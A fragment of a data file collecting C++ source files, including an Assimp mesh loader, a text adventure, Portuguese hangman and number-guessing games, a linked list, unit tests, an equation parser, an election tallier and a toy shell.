\"ERROR::ASIMP::\" << importer.GetErrorString() << std::endl;\n        return;\n    }\n    this->directory = path.substr(0, path.find_last_of(\"/\"));\n    printf(\"starting to process nodes \\n\");\n    this->process_node(scene->mRootNode, scene);\n    printf(\"processed all nodes\\n\");\n};\n\n/**\n * notes:\n * - recall that a node may contains a collection of meshes, and\n * also children nodes\n * - this function is guarenteed to terminate because modellers\n * create strctures made up of finitely many nodes and meshes.\n * - this can be thought of the same way that each folder in blender can have individual meshes inside or more\n * folders (I believe a folder is called a collection) and just represents arbitrary nesting\n */\nvoid Model::process_node(aiNode *node, const aiScene *scene) {\n    printf(\"stared processing meshes\\n\");\n    for (unsigned int i = 0; i < node->mNumMeshes; i++) {\n        aiMesh *mesh = scene->mMeshes[node->mMeshes[i]];\n        this->meshes.push_back(this->process_mesh(mesh, scene));\n    }\n    printf(\"finished processing meshes\\n\");\n    for (unsigned int i = 0; i < node->mNumChildren; i++) {\n        process_node(node->mChildren[i], scene);\n    }\n};\n\nglm::vec3 assimp_to_glm_3d_vector(aiVector3D assimp_vector) {\n    return {assimp_vector.x, assimp_vector.y, assimp_vector.z};\n}\n\nstd::vector<Vertex> Model::process_mesh_vertices(aiMesh *mesh) {\n    std::vector<Vertex> vertices;\n\n    bool mesh_has_texture_coordinates = mesh->mTextureCoords[0] != nullptr;\n    printf(\"This mesh has %d vertices\\n\", mesh->mNumVertices);\n    for (unsigned int i = 0; i < mesh->mNumVertices; i++) {\n        Vertex vertex;\n        vertex.position = assimp_to_glm_3d_vector(mesh->mVertices[i]);\n        vertices.push_back(vertex);\n    }\n    return vertices;\n}\n\n/**\n * \\brief given a mesh iterate through each face storing all indices of each vertex on that face\n */\nstd::vector<unsigned int> Model::process_mesh_indices(aiMesh *mesh) {\n    std::vector<unsigned int> indices;\n    for (unsigned int i = 0; i < mesh->mNumFaces; i++) {\n        aiFace face = mesh->mFaces[i];\n\n        assert(face.mNumIndices == 3); // if this is false we are not working with triangles\n\n        for (unsigned int j = 0; j < face.mNumIndices; j++) {\n            indices.push_back(face.mIndices[j]);\n        }\n    }\n    return indices;\n}\n\n/**\n * description\n * \ttakes in assimp's interpretation of a mesh, and then parses it\n * \tinto our version of a mesh\n */\nMesh Model::process_mesh(aiMesh *mesh, const aiScene *scene) {\n    std::vector<Vertex> vertices = this->process_mesh_vertices(mesh);\n    std::vector<unsigned int> indices = this->process_mesh_indices(mesh);\n    return {vertices, indices};\n};\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <cctype>\n#include <algorithm>\n#include <random>\n\nusing namespace std;\n\nenum en_DIRS {NORTH, EAST, SOUTH, WEST};\nenum en_ROOMS {SOUTH_MAIN_ROAD, TAVERN, ANCIENT_TREESTUMP, ADVENTURERS_GUILD, FORGE, GLOWING_POND, WINE_CELLAR, STABLES, PATH_OUT_OF_TOWN, BRIDGE, PASTURE, SIDE_ROAD, TOWN_HALL, FOUNDERS_STATUE, NORTH_MAIN_ROAD, BAKERY, FORGOTTEN_PATH, GRAVEYARD, ABANDONED_HOUSE, OVERGROWN_GARDEN, VILLAGERS_HOUSES, SMALL_VILLAGE_GARDEN, MAYORS_HOME, BROKEN_FOUNTAIN, SHOPPING_CENTER, APOTHECARY};\nenum en_VERBS {GET, DROP, USE, OPEN, CLOSE, EXAMINE, INVENTORY, LOOK, SEARCH,EXCHANGE};\nenum en_NOUNS {CELLAR_DOOR, OLD_COIN, EMPTY_ALE_BOTTLE, BASKET_OF_EGGS, DOG_BONE, NEWS_PAPER, LOST_RING, WATERING_CAN, COIN_PURSE, LOVE_POTION, FLYER, CHEESE_WHEEL, RUBY, DAGGER, COCONUT_PIECES};\n\nconst int NONE = -1;\nconst int DIRS = 4;\nconst int ROOMS = 26;\nconst int VERBS = 10;\nconst int NOUNS = 15;\n\nclass Room {\npublic:\n    string description;\n    int exits[DIRS];\n\n    Room() {}\n    \n    Room(const string& desc) : description(desc) {\n        for (int i = 0; i < DIRS; ++i) {\n            exits[i] = NONE;\n        }\n    }\n    ~Room()\n    {\n    }\n};\n\nclass Noun {\npublic:\n    string word; \n    string description;\n    int code;\n    int location;\n    bool canCarry;\n\n    Noun() {}\n    \n    Noun(const string& word_, const string& desc, int code_, int location_ = NONE, bool canCarry_ = false)\n        : word(word_), description(desc), code(code_), location(location_), canCarry(canCarry_) {}\n    ~Noun()\n    {\n    }\n};\n\nclass Word {\npublic:\n    string str;\n    int code;\n\n    Word() {}\n\n    Word(const string& str_, const int& code_)\n        :str(str_), code(code_){}\n    ~Word()\n    {\n    }\n};\n\nvoid set_rooms(vector<Room>& rooms)\n{\n    rooms.resize(ROOMS);\n    rooms[SOUTH_MAIN_ROAD] = Room(\"The main road of the village\");\n    rooms[SOUTH_MAIN_ROAD].exits[NORTH] = NORTH_MAIN_ROAD;\n    rooms[SOUTH_MAIN_ROAD].exits[EAST] = TAVERN;\n    rooms[SOUTH_MAIN_ROAD].exits[SOUTH] = SIDE_ROAD;\n    rooms[SOUTH_MAIN_ROAD].exits[WEST] = ADVENTURERS_GUILD;\n\n    rooms[TAVERN] = Room(\"Loud tavern with a bar, and rooms for rent.\");\n    rooms[TAVERN].exits[NORTH] = SHOPPING_CENTER;\n    rooms[TAVERN].exits[EAST] = NONE;\n    rooms[TAVERN].exits[SOUTH] = NONE;\n    rooms[TAVERN].exits[WEST] = SOUTH_MAIN_ROAD;\n\n    rooms[ANCIENT_TREESTUMP] = Room(\"This old stump once was the home of the fae.\");\n    rooms[ANCIENT_TREESTUMP].exits[NORTH] = NONE;\n    rooms[ANCIENT_TREESTUMP].exits[EAST] = NORTH_MAIN_ROAD;\n    rooms[ANCIENT_TREESTUMP].exits[SOUTH] = ADVENTURERS_GUILD;\n    rooms[ANCIENT_TREESTUMP].exits[WEST] = NONE;\n\n    rooms[ADVENTURERS_GUILD] = Room(\"A place for adventurers to gather, drink, and rest.\");\n    rooms[ADVENTURERS_GUILD].exits[NORTH] = ANCIENT_TREESTUMP;\n    rooms[ADVENTURERS_GUILD].exits[EAST] = SOUTH_MAIN_ROAD;\n    rooms[ADVENTURERS_GUILD].exits[SOUTH] = NONE;\n    rooms[ADVENTURERS_GUILD].exits[WEST] = NONE;\n\n    rooms[FORGE] = Room(\"A Dwarven forge with a few beautifully crafted swords on display.\");\n    rooms[FORGE].exits[NORTH] = NONE;\n    rooms[FORGE].exits[EAST] = NONE;\n    rooms[FORGE].exits[SOUTH] = NONE;\n    rooms[FORGE].exits[WEST] = SHOPPING_CENTER;\n\n    rooms[GLOWING_POND] = Room(\"Theres a pond here that emits a mysterious glow. It's in the center of new village.\");\n    rooms[GLOWING_POND].exits[NORTH] = BRIDGE;\n    rooms[GLOWING_POND].exits[EAST] = WINE_CELLAR;\n    rooms[GLOWING_POND].exits[SOUTH] = NORTH_MAIN_ROAD;\n    rooms[GLOWING_POND].exits[WEST] = VILLAGERS_HOUSES;\n\n    rooms[WINE_CELLAR] = Room(\"A hidden wine cellar by the pond. Is it still in use?\");\n    rooms[WINE_CELLAR].exits[NORTH] = NONE;\n    rooms[WINE_CELLAR].exits[EAST] = NONE;\n    rooms[WINE_CELLAR].exits[SOUTH] = NONE;\n    rooms[WINE_CELLAR].exits[WEST] = NONE;\n\n    rooms[STABLES] = Room(\"Many horses are kept here. The smell of hay and manure is strong.\");\n    rooms[STABLES].exits[NORTH] = PASTURE;\n    rooms[STABLES].exits[EAST] = VILLAGERS_HOUSES;\n    rooms[STABLES].exits[SOUTH] = NONE;\n    rooms[STABLES].exits[WEST] = NONE;\n\n    rooms[PATH_OUT_OF_TOWN] = Room(\"A path leading out of town. It looks a bit rough.\");\n    rooms[PATH_OUT_OF_TOWN].exits[NORTH] = NONE;\n    rooms[PATH_OUT_OF_TOWN].exits[EAST] = FORGOTTEN_PATH;\n    rooms[PATH_OUT_OF_TOWN].exits[SOUTH] = BRIDGE;\n    rooms[PATH_OUT_OF_TOWN].exits[WEST] = NONE;\n\n    rooms[BRIDGE] = Room(\"A stone bridge that leads to the path out of town. It looks newly built.\");\n    rooms[BRIDGE].exits[NORTH] = PATH_OUT_OF_TOWN;\n    rooms[BRIDGE].exits[EAST] = NONE;\n    rooms[BRIDGE].exits[SOUTH] = GLOWING_POND;\n    rooms[BRIDGE].exits[WEST] = NONE;\n\n    rooms[PASTURE] = Room(\"A pasture for adventurers horses to graze.\");\n    rooms[PASTURE].exits[NORTH] = NONE;\n    rooms[PASTURE].exits[EAST] = NONE;\n    rooms[PASTURE].exits[SOUTH] = STABLES;\n    rooms[PASTURE].exits[WEST] = NONE;\n\n    rooms[SIDE_ROAD] = Room(\"A small side road that leads to the important places in town.\");\n    roo",
    "#include <iostream>\n#include <stdlib.h>\nusing namespace std;\n\nint main(){\n    \n    char palavra[30], letra[1], secreta[30];\n    int tam, i, chances, acertos;\n    bool acerto;\n    \n    chances = 6;\n    tam = 0;\n    i = 0;\n    acerto = false;\n    acertos = 0;\n    \n    cout << \"Digite a palavra secreta: \\n\";\n    cin >> palavra;\n    system (\"clear\");\n    \n    while (palavra[i] != '\\0'){\n        i++;\n        tam++;\n    }\n    \n    for(i=0; i<tam; i++){\n        secreta[i] = '-';\n    }\n    \n    while ((chances > 0) && (acertos < tam)){\n        cout << \"Chances restantes: \" << chances << \"\\n\\n\";\n        cout << \"Palvra secreta: \";\n        for(i=0; i<tam; i++){\n            cout << secreta[i];\n        }\n        cout << \"\\n\\nDigite uma letra: \";\n        cin >> letra[0];\n        for(i=0; i<tam; i++){\n            if (palavra[i] == letra[0]){\n                acerto = true;\n                secreta[i] = palavra[i];\n                acertos++;\n            }\n        }\n        if (!acerto){\n            chances--;\n        }\n        acerto = false;\n        system(\"clear\");\n    }\n    if (acertos==tam){\n        cout << \"Voce venceu\";\n        \n    }else{\n        cout << \"perdeu, burro!\"; \n    }\n    return 0;\n    \n}",
    "#include <iostream>\n\nusing namespace std;\n\nstruct no{\n  string dado;\n  no *ptr_proximo_no;\n};\n\nstruct list{\n  no *ptr_primeiro_no;\n\n  void inicializar(){\n    ptr_primeiro_no = NULL;\n  }\n\n  void inserir(string novo_dado){\n    no *ptr_novo_no;\n    ptr_novo_no = new no;\n\n    ptr_novo_no->dado = novo_dado;\n\n    if (ptr_primeiro_no == NULL){\n      ptr_primeiro_no = ptr_novo_no;\n    }\n    else{\n      ptr_novo_no->ptr_proximo_no = ptr_primeiro_no;\n      ptr_primeiro_no = ptr_novo_no;\n    }\n  }\n\n  void imprimir(){\n    no *ptr_no_atual;\n    ptr_no_atual = ptr_primeiro_no;\n\n    while(ptr_no_atual != NULL){\n      cout << ptr_no_atual->dado << endl;\n      ptr_no_atual = ptr_no_atual->ptr_proximo_no;\n    }\n  }\n\n  void excluir_primeiro_no(){\n    if (ptr_primeiro_no != NULL){\n      no *ptr_aux;\n      ptr_aux = ptr_primeiro_no;\n      ptr_primeiro_no = ptr_primeiro_no->ptr_proximo_no;\n      delete ptr_aux;\n    }\n  }\n};\n\nint main(){\n  list lista_ligada;\n\n  lista_ligada.inicializar();\n  lista_ligada.inserir(\"Pera\");\n  lista_ligada.inserir(\"Maca\");\n  lista_ligada.inserir(\"Uva\");\n  lista_ligada.inserir(\"Melancia\");\n  lista_ligada.imprimir();\n  lista_ligada.excluir_primeiro_no();\n  lista_ligada.imprimir();\n}",
    "/*\n  Um algoritmo que tem como objetivo ser um jogo com 3 niveis de dificuldade, \nsendo elas: [facil, medio, dificil].\n  O jogo ter\u00e1 um numero sorteado e o objetivo do jogador \u00e9 descobrir o numero sorteado pelo metodo de tentativa e erro.\n*/\n#include <iostream> //Biblioteca principal de entrada e saida padr\u00e3o.\n#include <cstdlib> // Bibliotecas padr\u00e3o do c.\n#include <ctime> // Biblioteca time do c.\n\nusing namespace std; // using std para agilizar o proscesso de codar os 'cout' e 'cin'.\n\nbool chutes(short numSorte, short dificuldade, int *tentativas, short *pontos); // Mostrando minha fun\u00e7\u00e3o para o codigo.\n\nbool chutes(short numSorte, short dificuldade, int *tentativas, short *pontos){ // Declarando fun\u00e7\u00e3o.\n  short numChute = 0; // Dando um valor inicial para numChute.\n  short numD2 = -1; // Valor inicial para numD2.\n\n  if(dificuldade == 2){ // Se escolha da dificuldade seja media, fa\u00e7a numD2 == 16 e iniciar com 200 pontos.\n    numD2 = 16;\n    *pontos = 200;\n  }else if(dificuldade == 3){ // Se dificuldade for igual a dificil numD2 == 6 e iniciar com 300 pontos.\n    numD2 = 6;\n    *pontos = 300;\n  }\n\n  do{\n\n    cout << \"\\n\\tTentativas \" << *tentativas << \" chute um numero: \"; // Mostra o numero da tentativa indo de 0 a infinito dependendo da dificuldade escolhida.\n\n    cin >> numChute; // l\u00ea o valor chutado.\n\n    if(numChute < numSorte)cout << \"\\t\\033[1;91mSeu numero \u00e9 menor que o numero da sorte.\\x1b[0m\\n\"; // Se o numero chutado for menor que numro sorteado vai escrever em vermelho uma mensagem sobre.\n    else if(numChute > numSorte) cout << \"\\t\\033[1;33mSeu numero \u00e9 maior que o numero da sorte.\\x1b[0m\\n\"; // Se o numero chutado for maior que numro sorteado vai escrever em amarelo uma mensagem sobre.\n\n    if(*tentativas > 0 || numChute == numSorte){ // Condi\u00e7\u00e3o para pular a primeira execu\u00e7\u00e3o e caso acerte.\n      if(dificuldade == 1) *pontos = *pontos - 2; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n      else if(dificuldade == 2) *pontos = *pontos - 12; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n      else if(dificuldade == 3) *pontos = *pontos - 43; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n    }\n\n    *tentativas = *tentativas + 1; // Acrescenta 1 a tentativas.\n  }while(numChute != numSorte && *tentativas != numD2); // Vai continuar perguntando o valor sorteado at\u00e9 que acerte ou acabe o numero definido de tentativas(O numero de tentativas ser\u00e1 definido de acordo com o nivel de dificuldade escolhida pelo jogador.).\n\n  return (numChute == numSorte); // Retorna um valor boleano sendo 1 : 0\n}\n\nint main(){\n  \n  srand(time(NULL));\n  const short numSorte = rand() % 101; // O numero sorteado\n\n  short dificuldade = 0; // Valor inicial para dificuldade\n  int tentativas = 0; // valor inicial para o numero de tentativas\n  short pontos = 100; // valor inicial de pontos, para caso seja escolhida a dificuldade 1.\n\n  cout << \"\\t********************\\n\";\n  cout << \"\\t*----Hello Word----*\\n\";\n  cout << \"\\t********************\\n\";\n\n  cout << \"\\n\\tEscolha sua dificuldade \\n \\x1b[1;96mfacil: 1\\n \\x1b[1;90mmedio: 2\\n \\x1b[1;95mdificil: 3\\n\\t\\x1b[0mdificuldade: \";\n  cin >> dificuldade; // Escolhe a dificuldade.\n\n  if(chutes(numSorte, dificuldade, &tentativas, &pontos)) cout << \"\\n\\t\\x1b[1;33mVoc\u00ea ganhou, parab\u00e9ns\\n\"; // Aqui vai executar a fun\u00e7\u00e3o chutes e quado finalizar vai retornar um valor boleano, sendo que se for verdadeiro, aparecer\u00e1 a mensagem para o jogador que ele ganhou.\n  else{\n    cout << \"\\n\\t\\033[91mVoc\u00ea perdeu. O numero era \" << numSorte << \" quem sabe na proxima.\\n\"; // Caso contrario mostrar\u00e1 a mensagem que perdeu.\n    pontos = 0; // E vai perder a pontua\u00e7\u00e3o.\n  }\n\n  cout << \"\\n\\tVoc\u00ea tentou \" << tentativas << \" vezes\\n\\n\\t\" << pontos << \" Pontos\\n\\n\"; // Mostra o numero de vezes que chutou at\u00e9 acertar ou at\u00e9 perder, e mostra sua pontua\u00e7\u00e3o final.\n}\n",
    "#include <gtest/gtest.h>\n#include \"gui/widgets/packages/SettingsDataPackage.h\"\n\nnamespace tadaima\n{\n    namespace gui\n    {\n        namespace widget\n        {\n            class SettingsDataPackageTest : public ::testing::Test\n            {\n            protected:\n                SettingsDataPackageTest() : package() {}\n\n                SettingsDataPackage package;\n            };\n\n            TEST_F(SettingsDataPackageTest, ConstructorInitializesPackageType)\n            {\n                EXPECT_EQ(package.id(), static_cast<tools::DataPackage::Identifier>(PackageType::Settings));\n            }\n\n            TEST_F(SettingsDataPackageTest, SetAndGetSettings)\n            {\n                package.set(SettingsPackageKey::Username, std::string(\"testuser\"));\n                package.set(SettingsPackageKey::DictionaryPath, std::string(\"/path/to/dictionary\"));\n                package.set(SettingsPackageKey::AnswerWordType, std::string(\"hello\"));\n                package.set(SettingsPackageKey::AskedWordType, std::string(\"latin\"));\n\n                EXPECT_EQ(package.get<std::string>(SettingsPackageKey::Username), \"testuser\");\n                EXPECT_EQ(package.get<std::string>(SettingsPackageKey::DictionaryPath), \"/path/to/dictionary\");\n                EXPECT_EQ(package.get<std::string>(SettingsPackageKey::AnswerWordType), \"hello\");\n                EXPECT_EQ(package.get<std::string>(SettingsPackageKey::AskedWordType), \"latin\");\n            }\n\n            TEST_F(SettingsDataPackageTest, HandleEmptyValues)\n            {\n                package.set(SettingsPackageKey::Username, std::string(\"\"));\n                package.set(SettingsPackageKey::DictionaryPath, std::string(\"\"));\n                package.set(SettingsPackageKey::AnswerWordType, std::string(\"\"));\n                package.set(SettingsPackageKey::AskedWordType, std::string(\"\"));\n\n                EXPECT_EQ(package.get<std::string>(SettingsPackageKey::Username), \"\");\n                EXPECT_EQ(package.get<std::string>(SettingsPackageKey::DictionaryPath), \"\");\n                EXPECT_EQ(package.get<std::string>(SettingsPackageKey::AnswerWordType), \"\");\n                EXPECT_EQ(package.get<std::string>(SettingsPackageKey::AskedWordType), \"\");\n            }\n\n        } // namespace widget\n    } // namespace gui\n} // namespace tadaima\n",
    "//\n// Created by Hypericats on 5/9/2024.\n//\n\n#include \"ConsoleInteractionHandler.h\"\n\nstd::vector<std::string> ConsoleInteractionHandler::getMath() {\n    std::vector<std::string> v;\n    std::cout << \"Enter equation line by line (type exit when done)\" << std::endl;\n    std::string str;\n    while (str != \"exit\") {\n        std::cout << \"Enter next equation :\" << std::endl;\n        std::cin >> str;\n        if (str == \"exit\") break;\n        v.emplace_back(str);\n    }\n    return v;\n}\n\n//typing equations in got looong\nstd::vector<std::string> ConsoleInteractionHandler::getMathFromFile(std::string filePath) {\n    std::ifstream f(filePath);\n    std::istream_iterator<std::string> start(f), end;\n    return std::vector<std::string>(start, end);\n}\n\nMatrixd* ConsoleInteractionHandler::parseMath(std::vector<std::string> math, std::vector<std::string>& variableOrder) {\n    variableOrder.clear();\n    int columnSize = math.size();\n    int rowSize;\n    Matrixd* matrixd = nullptr;\n    for (int j = 0; j < math.size(); j++) {\n        //std::cout << math.at(j) << std::endl;\n        std::string  equation = math.at(j);\n\n        //remove spaces so we don't need to worry about that\n        equation.erase(std::remove(equation.begin(), equation.end(), ' '), equation.end());\n        std::vector<std::string> results = Util::splitString(equation, '=');\n        std::string str = results.at(0);\n        //std::cout << results.at(0) << std::endl;\n        //std::cout << results.at(1) << std::endl;\n\n        //add + for every - so we can split at every +\n        //start i=1 because if the first is a negative we dont want to add a +\n        for (int i = 1; i < str.size(); i++) {\n            if (str[i] == '-') {\n                str.insert(i, \"+\");\n                i++;\n            }\n        }\n        std::vector<std::string> components = Util::splitString(str, '+');\n        //initialization if not done already\n        if (j == 0) {\n            rowSize = getVarCount(str) + 1;\n            matrixd = new Matrixd(rowSize, columnSize);\n        }\n        for (std::string c : components) {\n            std::string variable;\n            double coef = 1.0;\n            parseComponent(variable, coef, c);\n            if (j == 0) variableOrder.emplace_back(variable);\n            //std::cout << \"Variable order : \" << std::endl;\n            //Util::printVec(variableOrder);\n            //std::cout << \"Index : \" << Util::indexOf(variable, variableOrder) << std::endl;\n            //std::cout << \"J : \" << j << std::endl;\n            //std::cout << \"coef : \" << coef << std::endl;\n            matrixd->set(Util::indexOf(variable, variableOrder), j, coef);\n            //std::cout << matrixd->toString();\n        }\n        matrixd->set(rowSize - 1, j, std::stod(results.at(1)));\n    }\n    return matrixd;\n}\n\nvoid ConsoleInteractionHandler::parseComponent(std::string& variable, double& coef, std::string component) {\n    //std::cout << component << std::endl;\n    for (int i = 0; i < component.size(); i++) {\n        if (isalpha(component[i])) {\n            variable = component[i];\n            component.erase(i);\n            break;\n        }\n    }\n    try {\n        coef = std::stod(component);\n    }\n    catch (std::exception& ignore) {\n        for (char c : component) {\n            if (c == '-') {\n                coef = -1;\n                return;\n            }\n        }\n        //this means that there was no coef and it was positive therefore coef should be 1 which it already is as that is the initial value\n    }\n}\n\nint ConsoleInteractionHandler::getVarCount(std::string& str) {\n    int count = 0;\n    for (char cha : str) {\n        if (isalpha(cha)) count++;\n    }\n    return count;\n}\n\n",
    "#include <fstream>\n#include <iostream>\n#include <limits>\n#include <string>\n#include <sstream>\n\n#include \"CPLSystem.h\"\n#include \"OPLSystem.h\"\n#include \"MPOSystem.h\"\n#include \"MVSystem.h\"\n#include \"Party.h\"\n#include \"Candidate.h\"\n#include \"ElectionSystem.h\"\n#include \"Results.h\"\n\n// #include <format> \n#include <cstdio>\n#include <stdio.h>\n\n// git pull --rebase\n\n// clear; g++ -o election *.cpp ; ./election _cpl.txt\n\n// clear; make clean; make run FILES=../testing/test_cpl.csv\n// clear; make clean; make run FILES=\"../testing/_cpl.csv ../testing/_cpl.csv\"\n// clear; make run FILES=\"../testing/m_cpl1.csv ../testing/m_cpl2.csv ../testing/m_cpl3.csv\"\n// clear; make run FILES=\"../testing/m_opl1.csv ../testing/m_opl2.csv ../testing/m_opl3.csv\"\n\n// clear; make run FILES=\"../testing/_opl1.csv ../testing/_opl2.csv ../testing/_opl3.csv\"\n\n// clear; make unittest\n\n\n// clear; make clean; make run FILES=../testing/_mpo.csv\n\n//  clear; make clean; make run FILES=../testing/_mv.csv\n//  clear; make clean; make run FILES=\"../testing/m_mv1.csv ../testing/m_mv2.csv ../testing/m_mv3.csv\"\n\n\n// Split string based on a delimiter\nstd::vector<std::string> splitFile(const std::string &s, char delimiter) {\n    std::vector<std::string> elems;\n    std::stringstream ss(s);\n    std::string item;\n    while (getline(ss, item, delimiter)) {\n        elems.push_back(item);\n    }\n    return elems;\n}\n\n// Check if files can be opened, return a list of filenames that couldn't be opened\nvoid tryToOpenFiles(std::vector<std::string>& filenames, std::vector<std::string>& successfulFiles, std::vector<std::string>& failedFiles) {\n    for (const auto& filename : filenames) {\n        std::ifstream file(filename);\n        if (!file.is_open()) {\n            failedFiles.push_back(filename);\n        } else {\n            successfulFiles.push_back(filename);\n        }\n    }\n}\n\n\n\nint main(int argc, char* argv[]) {\n  std::vector<std::string> allFilenames, successfulFiles, failedToOpen;\n\n  // try to open given files, rememeber failedToOpen\n  if (argc > 1) {\n        // first argument is program name, so start at the second argument,\n        // then go until the end of the past the last element of the array\n        // using \"argv + argc\"\n        allFilenames.assign(argv + 1, argv + argc);\n    } else {\n        std::string input;\n        std::cout << \"\\nPlease enter filenames separated by spaces: \";\n        std::getline(std::cin, input);\n        allFilenames = splitFile(input, ' ');\n    }\n\n  tryToOpenFiles(allFilenames, successfulFiles, failedToOpen);\n\n  // while there are still files that cannot be opened, ask user to retype file name\n  while (!failedToOpen.empty()) {\n\n    std::cout << \"Unable to open the following files:\\n\";\n    for (const auto& file : failedToOpen) {\n        std::cout << file << std::endl;\n    }\n\n    std::vector<std::string> retryFilenames;\n\n    std::cout << \"Please re-enter the filenames for the files above, separated by spaces: \";\n    std::string input;\n    std::getline(std::cin, input);\n    retryFilenames = splitFile(input, ' ');\n\n   // Attempt to open the files from the retry list\n    std::vector<std::string> newSuccessfulFiles, newFailedFiles;\n    tryToOpenFiles(retryFilenames, newSuccessfulFiles, newFailedFiles);\n\n    // Merge new successful files into the main successful files list\n    successfulFiles.insert(successfulFiles.end(), newSuccessfulFiles.begin(), newSuccessfulFiles.end());\n\n    // Prepare for the next iteration if there are still files that failed to open\n    failedToOpen.clear();\n    for (const auto& file : newFailedFiles) {\n    if (std::find(successfulFiles.begin(), successfulFiles.end(), file) == successfulFiles.end()) {\n        // Only re-add to failedToOpen if not found in successfulFiles\n        failedToOpen.push_back(file);\n        }\n    }\n  }\n\n  std::cout << \"\\n\\n\";\n\n  \n\n\n  std::string electionType, line;\n  int seats,  partiesCandidates;\n\n  std::ifstream file;\n  std::string filename;\n\n  filename = successfulFiles.at(0);\n  // filename =\"../testing/_cpl0.csv\";\n  file.open(filename);\n\n  // Read election type\n  std::getline(file, electionType);\n\n  // Results result;\n  std::string displayResult;\n  std::string auditResult;\n\n\n  if (electionType == \"CPL\" || electionType == \"OPL\") { \n    // Read num of seats\n    std::getline(file, line);\n    seats = std::stoi(line);\n\n    // Read num of votes\n    std::getline(file, line);\n\n    // Read number of parties/candidates\n    std::getline(file, line);\n    partiesCandidates = std::stoi(line);\n    file.close(); \n\n\n    // Now we start to process elections with similar headers\n    if (electionType == \"CPL\") {\n      CPLSystem election(filename);\n      election.setSeats(seats);\n      election.setParties(partiesCandidates);\n      election.processCandidates();\n\n      for (const auto& file : successfulFiles) {\n        std::cout << file << \"\\n\";\n        election.setFilename(file);\n        election.countVotes();\n      }\n\n      election.allocateSeats();\n      displayResult = election.displayResults();\n      a",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <cstring>\n#include <unistd.h>\n#include <sys/wait.h>\n#include <sys/stat.h>\n#include <pwd.h>\n#include <filesystem>\n\nusing namespace std;\n\nstring prompt;\nstring welcome;\nstring input;\n\n// Defining methods\nstring getHomeDirectory();\nstring formatText(const string &value);\nint shell();\nint executeCommand(string command);\nint executeCommandFromFile(string file);\nint help(string parameters);\nint echo(string text);\nint set(string parameters);\nint writeWelcome();\nint getWelcome();\nint writePrompt();\nint getPrompt();\nint createConfigDir();\n\nint main(int argc, char *argv[])\n{\n    if (argc >= 3 && strcmp(argv[1], \"-c\") == 0)\n    {\n        string command;\n        for (int args = 2; args < argc; args++)\n        {\n            cout << args;\n            command.append(argv[args]);\n            command.append(\" \");\n        }\n        executeCommand(command);\n        cout << command;\n        exit(0);\n    }\n\n    // Get prompt from configuration and if not set use default prompt\n    if (getPrompt())\n    {\n        cout << \"Run \\\"set prompt\\\" to set a prompt.\" << endl;\n        prompt = \"\\033[36m[{username}@{hostname}] \\033[37m{cwd} \\033[36m$ \";\n        writePrompt();\n    }\n\n    // Get welcome from configuration and apply placeholders and colors\n    getWelcome();\n    if (welcome != \"\")\n    {\n        cout << formatText(welcome) << endl;\n    }\n\n    while (true)\n    {\n        shell();\n    }\n}\n\n// Prompt and input handler\nint shell()\n{\n    cout << formatText(prompt) + \"\\033[0m\";\n    getline(cin, input);\n    executeCommand(input);\n    return 0;\n}\n\n// Executes a command\nint executeCommand(string command)\n{\n    if (command.find(\"cd \") == 0)\n    {\n        chdir(command.substr(3).data());\n    }\n    else if (command.find(\"set\") == 0)\n    {\n        if (command.size() >= 4)\n        {\n            set(command.substr(4).data());\n        }\n        else\n        {\n            set(\"\");\n        }\n    }\n    else if (command.find(\"exit\") == 0)\n    {\n        int exitcode = 1;\n        if (command.size() > 5)\n        {\n            exitcode = stoi(command.substr(5));\n        }\n        exit(exitcode);\n    }\n    else if (command.find(\"echo\") == 0)\n    {\n        if (command.size() > 5)\n        {\n            echo(command.substr(5).data());\n        }\n    }\n    else if (command.find(\"help\") == 0)\n    {\n        if (command.size() > 5)\n        {\n            help(command.substr(5).data());\n        }\n        else\n        {\n            help(\"\");\n        }\n    }\n    else if (command != \"\")\n    {\n        executeCommandFromFile(command);\n    }\n    return 0;\n}\n\n// Executes a file\nint executeCommandFromFile(string file)\n{\n    istringstream iss(file);\n    vector<char *> args;\n    string arg;\n    while (iss >> arg)\n    {\n        args.push_back(strdup(arg.c_str()));\n    }\n    args.push_back(nullptr);\n\n    pid_t pid = fork();\n    if (pid == 0)\n    {\n        if (execvp(args[0], const_cast<char *const *>(args.data())) == -1)\n        {\n            if (errno == ENOENT)\n            {\n                cerr << \"Error: Command '\" << file << \"' not found.\" << endl;\n                exit(1);\n            }\n        }\n    }\n    else if (pid > 0)\n    {\n        wait(NULL);\n    }\n    else\n    {\n        cout << \"Failed to fork process.\" << endl;\n    }\n    for (auto &arg : args)\n    {\n        free(arg);\n    }\n    return 0;\n}\n\n// Shows the help message\nint help(string parameters)\n{\n    if (parameters == \"commands\")\n    {\n        cout << \"Shelly provides the following built-in commands:\\n\\n\"\n                     \"- set <prompt/placeholder> <value>: Allows changing the prompt or placeholder.\\n\"\n                     \"- cd <directory>: Changes the current directory.\\n\"\n                     \"- echo [text]: Writes text to the console.\\n\"\n                     \"- exit [exit code]: Exits the shell.\\n\";\n    }\n    else if (parameters == \"placeholders\")\n    {\n        cout << \"Placeholders are a symbolic representation of something that will later be replaced with it's actual value later by the shell. This can be used in your prompt or welcome message.\\n\\n\"\n                     \"- {cwd}: Current working directory.\\n\"\n                     \"- {username}: Username of the current user.\\n\"\n                     \"- {hostname}: Hostname (PC name).\\n\";\n    }\n    else if (parameters == \"colors\")\n    {\n        cout << \"You can use the \\\\033[Xm sequence to adjust the foreground and background colors of your prompt or welcome message text. Simply substitute 'X' with the appropriate color code from the provided table:\\n\\n\"\n                     \"| Color Name  | Foreground Color Code  | Background Color Code |\\n\"\n                     \"| Black       | 30                     | 40                    |\\n\"\n                     \"| Red         | 31                     | 41                    |\\n\"\n                     \"| Green       | 32                     | 42                    |\\n\"\n                     \"| Yellow      | 33                     | 43 ",
